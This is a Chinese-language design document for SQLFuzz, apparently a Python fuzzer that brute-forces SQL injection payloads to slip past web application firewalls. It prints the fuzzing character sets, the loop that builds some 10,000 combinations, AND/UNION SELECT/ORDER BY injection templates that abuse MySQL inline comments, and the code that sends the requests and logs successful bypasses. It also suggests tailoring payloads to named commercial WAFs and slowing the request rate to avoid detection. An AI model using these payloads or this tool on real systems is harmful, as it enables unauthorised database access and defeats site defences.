# SQLFuzz 技术规范

本文档详细介绍 SQLFuzz 工具的技术原理、设计思路和实现细节。

## 核心原理

SQLFuzz 通过组合各种特殊字符和编码字符，生成大量不同的 SQL 注入 payload，利用 SQL 语法的灵活性和 WAF 规则的缺陷，尝试绕过各种 Web 应用防火墙的防护机制。

## 字符集设计

工具使用三类特殊字符集：

### 1. 特殊语法字符 (fuzz_zs)

```python
fuzz_zs = ['/*','*/','/*!','/**/','?','/','*','=','`','!','%','_','-','+']
```

这些字符主要包括：
- SQL 注释标记：`/*`, `*/`, `/*!`, `/**/` 
- SQL 特殊运算符：`=`, `!`, `%`, `_`, `-`, `+`
- 其他特殊字符：`?`, `/`, `*`, `\``

### 2. 空白字符编码 (fuzz_ch)

```python
fuzz_ch = ["%09","%0a","%0b","%0c","%0d","%20","%a0"]
```

这些是各种空白字符的 URL 编码：
- `%09`: 水平制表符 (HT)
- `%0a`: 换行符 (LF)
- `%0b`: 垂直制表符 (VT)
- `%0c`: 换页符 (FF)
- `%0d`: 回车符 (CR)
- `%20`: 空格
- `%a0`: 不间断空格 (NBSP)

### 3. 其他字符 (fuzz_sz)

```python
fuzz_sz = ['']
```

目前为空字符，可以根据需要扩展添加其他特殊字符。

## 组合算法

SQLFuzz 使用嵌套循环创建字符组合，默认使用三层嵌套：

```python
for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            payload = "'/**//*!*/and/*!*/"+a+b+c+"/**/'1'='1"
```

组合总数计算公式：`len(fuzz)^n`，其中 n 是嵌套层数。例如，使用默认配置时：
- 字符总数：`len(fuzz) = len(fuzz_zs) + len(fuzz_ch) + len(fuzz_sz) = 14 + 7 + 1 = 22`
- 三层嵌套组合总数：`22^3 = 10,648` 种不同组合

## Payload 模板设计

SQLFuzz 使用预定义的 payload 模板，将生成的字符组合插入模板中：

```python
# 示例 1：AND 条件注入
payload = "'/**//*!*/and/*!*/"+a+b+c+"/**/'1'='1"

# 示例 2：UNION SELECT 注入
payload = "'/*!union"+a+b+c+"select*/1,2#"

# 示例 3：ORDER BY 注入
payload = "'/**//*!*/AND/*!*/"+a+b+c+"/**/order/**/by/**/1--+"
```

这些模板利用了 SQL 语法的灵活性和注释处理机制，特别是 MySQL 特有的 `/*!...*/` 内联注释语法（这种注释中的内容会被 MySQL 执行）。

## 请求处理与结果分析

1. **请求构造**：
   ```python
   url = url_start + payload+"&Submit=Submit#"
   res = requests.get(url = url, headers = headers)
   ```

2. **响应分析**：
   ```python
   if "First name: admin" in res.text:
       print("\033[0;33m[*]Find BypassWAF Payload:\033[0m"+url)         
       with open ("Results.txt",'a') as r:
           r.write(url+"\n")
   ```

3. **进度显示**：
   ```python
   sys.stdout.write(' '*30 +'\r')
   sys.stdout.flush()
   print("Now URL:"+url)
   sys.stdout.write("完成进度:%s/%s \r" %(num,len))
   sys.stdout.flush()
   ```

## WAF 绕过原理

SQLFuzz 利用以下技术绕过 WAF：

1. **注释混淆**：使用 `/**/`, `/*!*/` 等注释标记打断关键词，使 WAF 无法正确识别。

2. **空白字符变种**：使用各种不同的空白字符编码（如 `%09`, `%0a`, `%20` 等）替代普通空格，绕过基于空格识别的规则。

3. **特殊字符插入**：在关键词中插入特殊字符，打断 WAF 的规则匹配。

4. **内联注释执行**：利用 MySQL 的 `/*!...*/` 语法，让注释中的内容被数据库执行但被 WAF 当作注释忽略。

## 性能优化

当前版本使用三层嵌套，生成约 10,000 种组合。增加嵌套层数会指数级增加组合数：

- 四层嵌套：`22^4 ≈ 234,256` 种组合
- 五层嵌套：`22^5 ≈ 5,153,632` 种组合

为了提高效率，可以考虑的优化方式：

1. **并行请求**：使用多线程或异步请求并行测试多个 payload。

2. **智能组合**：基于历史成功率，优先测试更可能成功的字符组合。

3. **增量测试**：先测试简单组合，根据反馈逐步增加复杂度。

## 扩展方向

1. **更多的 WAF 类型支持**：针对不同的 WAF（如安全狗、宝塔、云锁等）定制不同的 payload 模板。

2. **自动响应分析**：自动学习成功响应的特征，无需手动指定成功标志。

3. **图形化界面**：开发 GUI 界面，方便配置和查看结果。

4. **更多注入类型**：扩展支持盲注、时间盲注、报错注入等多种注入类型。

## 技术限制

1. **请求量大**：默认配置下需要发送上万个请求，可能触发目标站点的限流或封禁。

2. **特定环境假设**：当前成功判断逻辑假设目标是特定类型的应用（如 DVWA），对其他应用需要调整。

3. **误报可能**：部分成功 payload 可能是由于其他原因导致的假阳性结果。

## 最佳实践建议

1. **递进测试**：先使用简单组合，确认存在 SQL 注入漏洞后再进行复杂的 WAF 绕过测试。

2. **限制请求频率**：添加请求延迟，避免触发目标站点的防护机制。

3. **精简字符集**：根据目标 WAF 特性，精简测试字符集，提高效率。

4. **持续更新**：根据测试结果和新发现的绕过技术，持续更新 payload 模板和字符集。 